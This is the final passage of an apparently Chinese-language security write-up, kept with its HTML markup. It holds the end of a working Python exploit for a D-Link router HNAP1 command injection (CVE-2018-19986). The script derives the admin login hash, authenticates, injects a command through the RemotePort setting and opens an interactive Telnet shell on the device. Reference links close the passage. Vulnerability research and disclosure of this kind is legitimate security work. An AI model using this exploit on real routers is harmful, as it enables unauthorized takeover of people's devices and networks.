<span class="n">challenge</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;Challenge&gt;"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;/Challenge&gt;"</span><span class="p">)])</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;Cookie&gt;"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;/Cookie&gt;"</span><span class="p">)]</span>
<span class="n">publicKey</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;PublicKey&gt;"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;/PublicKey&gt;"</span><span class="p">)])</span>
<span class="n">privateKey</span> <span class="o">=</span> <span class="n">hmac_md5</span><span class="p">(</span><span class="n">publicKey</span> <span class="o">+</span> <span class="n">adminPw</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">hmac_md5</span><span class="p">(</span><span class="n">privateKey</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>

<span class="c1">#构造action为login的请求，发送用户名和口令</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"HNAP_AUTH"</span><span class="p">]</span> <span class="o">=</span> <span class="n">HNAP_AUTH</span><span class="p">(</span><span class="s2">"Login"</span><span class="p">,</span> <span class="n">privateKey</span><span class="p">)</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Cookie"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"uid="</span> <span class="o">+</span> <span class="n">cookie</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="s1">'&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">#登录成功后访问SetRouterSettings设置路由器的一些配置，其中RemotePort被设置为command</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Origin"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="n">IP</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"HNAP_AUTH"</span><span class="p">]</span> <span class="o">=</span> <span class="n">HNAP_AUTH</span><span class="p">(</span><span class="s2">"SetRouterSettings"</span><span class="p">,</span> <span class="n">privateKey</span><span class="p">)</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"SOAPaction"</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'"http://purenetworks.com/HNAP1/SetRouterSettings"'</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text/xml"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'{}.xml'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">"CVE-2018-19986"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'ip'</span><span class="p">,</span> <span class="n">IP</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'COMMAND'</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
<span class="k">print</span> <span class="s1">'[*] command injection'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="k">print</span> <span class="s1">'[*] waiting 30 sec...'</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>

<span class="c1">#利用成功之后，服务端已经开启了Telnet服务，攻击者可直接连服务器的Telnet</span>
<span class="k">print</span> <span class="s1">'[*] enjoy your shell'</span>
<span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">(</span><span class="n">IP</span><span class="p">)</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="03066b697f36d7f0c3ea729ed54f84b2">参考链接</h2>
<p>【1】 <a href="https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990" target="_blank">https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990</a></p>
<p>【2】InfoSec Handlers Diary Blog - More on HNAP - What is it, How to Use it, How to Find it  <a href="https://isc.sans.edu//diary/More+on+HNAP+-+What+is+it,+How+to+Use+it,+How+to+Find+it/17648" target="_blank">https://isc.sans.edu//diary/More+on+HNAP+-+What+is+it,+How+to+Use+it,+How+to+Find+it/17648</a></p>
<p>【3】<a href="https://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf" target="_blank">https://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf</a></p>
<p>【4】Hacking the D-Link DIR-890L – ccSec | 漏洞人生  <a href="http://www.vuln.cn/6237" target="_blank">http://www.vuln.cn/6237</a></p>
</div>
</div>